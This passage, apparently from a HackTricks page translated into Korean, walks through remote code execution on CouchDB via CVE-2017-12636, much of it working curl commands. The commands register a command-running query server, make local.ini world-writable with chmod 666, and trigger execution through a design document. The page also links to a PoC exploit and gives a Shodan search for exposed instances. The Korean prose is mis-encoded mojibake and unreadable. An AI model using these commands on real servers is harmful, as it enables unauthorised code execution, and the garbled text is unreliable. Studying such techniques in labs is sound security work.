ê²ƒì…ë‹ˆë‹¤:
```bash
curl http://localhost:5984
curl http://0xdf:df@localhost:5984/_config/query_servers/
```
CouchDB ë²„ì „ 2.0ì„ ìˆ˜ìš©í•˜ê¸° ìœ„í•´ ìƒˆë¡œìš´ ê²½ë¡œê°€ ì‚¬ìš©ë©ë‹ˆë‹¤:
```bash
curl 'http://0xdf:df@localhost:5984/_membership'
curl http://0xdf:df@localhost:5984/_node/couchdb@localhost/_config/query_servers
```
ìƒˆ ì¿¼ë¦¬ ì„œë²„ë¥¼ ì¶”ê°€í•˜ê³  í˜¸ì¶œí•˜ë ¤ëŠ” ì‹œë„ëŠ” ë‹¤ìŒ ì¶œë ¥ì—ì„œ ë‚˜íƒ€ë‚œ ê²ƒì²˜ëŸ¼ ê¶Œí•œ ê´€ë ¨ ì˜¤ë¥˜ë¡œ ì´ì–´ì¡ŒìŠµë‹ˆë‹¤:
```bash
curl -X PUT 'http://0xdf:df@localhost:5984/_node/couchdb@localhost/_config/query_servers/cmd' -d '"/sbin/ifconfig > /tmp/df"'
```
ì¶”ê°€ ì¡°ì‚¬ë¥¼ í†µí•´ `local.ini` íŒŒì¼ì— ëŒ€í•œ ê¶Œí•œ ë¬¸ì œê°€ ë°œê²¬ë˜ì—ˆìœ¼ë©°, í•´ë‹¹ íŒŒì¼ì€ ì“°ê¸° ë¶ˆê°€ëŠ¥í–ˆìŠµë‹ˆë‹¤. root ë˜ëŠ” homer ì ‘ê·¼ ê¶Œí•œìœ¼ë¡œ íŒŒì¼ ê¶Œí•œì„ ìˆ˜ì •í•¨ìœ¼ë¡œì¨ ì§„í–‰í•  ìˆ˜ ìˆê²Œ ë˜ì—ˆìŠµë‹ˆë‹¤:
```bash
cp /home/homer/etc/local.ini /home/homer/etc/local.ini.b
chmod 666 /home/homer/etc/local.ini
```
í›„ì† ì¿¼ë¦¬ ì„œë²„ ì¶”ê°€ ì‹œë„ê°€ ì„±ê³µí–ˆìœ¼ë©°, ì´ëŠ” ì‘ë‹µì— ì˜¤ë¥˜ ë©”ì‹œì§€ê°€ ì—†ìŒì„ í†µí•´ ì…ì¦ë˜ì—ˆìŠµë‹ˆë‹¤. `local.ini` íŒŒì¼ì˜ ì„±ê³µì ì¸ ìˆ˜ì •ì€ íŒŒì¼ ë¹„êµë¥¼ í†µí•´ í™•ì¸ë˜ì—ˆìŠµë‹ˆë‹¤:
```bash
curl -X PUT 'http://0xdf:df@localhost:5984/_node/couchdb@localhost/_config/query_servers/cmd' -d '"/sbin/ifconfig > /tmp/df"'
```
ë°ì´í„°ë² ì´ìŠ¤ì™€ ë¬¸ì„œë¥¼ ìƒì„±í•œ í›„, ìƒˆë¡œ ì¶”ê°€ëœ ì¿¼ë¦¬ ì„œë²„ì— ë§¤í•‘ëœ ì‚¬ìš©ì ì •ì˜ ë·°ë¥¼ í†µí•´ ì½”ë“œë¥¼ ì‹¤í–‰í•˜ë ¤ëŠ” ì‹œë„ê°€ ì´ì–´ì¡ŒìŠµë‹ˆë‹¤:
```bash
curl -X PUT 'http://0xdf:df@localhost:5984/df'
curl -X PUT 'http://0xdf:df@localhost:5984/df/zero' -d '{"_id": "HTP"}'
curl -X PUT 'http://0xdf:df@localhost:5984/df/_design/zero' -d '{"_id": "_design/zero", "views": {"anything": {"map": ""} }, "language": "cmd"}'
```
A **[ìš”ì•½](https://github.com/carlospolop/hacktricks/pull/116/commits/e505cc2b557610ef5cce09df6a14b10caf8f75a0)**ì€ íŠ¹ì • ì¡°ê±´ì—ì„œ CVE-2017-12636ì„ ì•…ìš©í•˜ëŠ” ë° ëŒ€í•œ ì¶”ê°€ í†µì°°ë ¥ì„ ì œê³µí•©ë‹ˆë‹¤. ì´ ì·¨ì•½ì ì„ ì•…ìš©í•˜ê¸° ìœ„í•œ **ìœ ìš©í•œ ë¦¬ì†ŒìŠ¤**ëŠ” ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤:

- [POC ìµìŠ¤í”Œë¡œì‡ ì½”ë“œ](https://raw.githubusercontent.com/vulhub/vulhub/master/couchdb/CVE-2017-12636/exp.py)
- [ìµìŠ¤í”Œë¡œì‡ ë°ì´í„°ë² ì´ìŠ¤ í•­ëª©](https://www.exploit-db.com/exploits/44913/)

## Shodan

* `port:5984 couchdb`

## References

* [https://bitvijays.github.io/LFF-IPS-P2-VulnerabilityAnalysis.html](https://bitvijays.github.io/LFF-IPS-P2-VulnerabilityAnalysis.html)
* [https://0xdf.gitlab.io/2018/09/15/htb-canape.html#couchdb-execution](https://0xdf.gitlab.io/2018/09/15/htb-canape.html#couchdb-execution)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
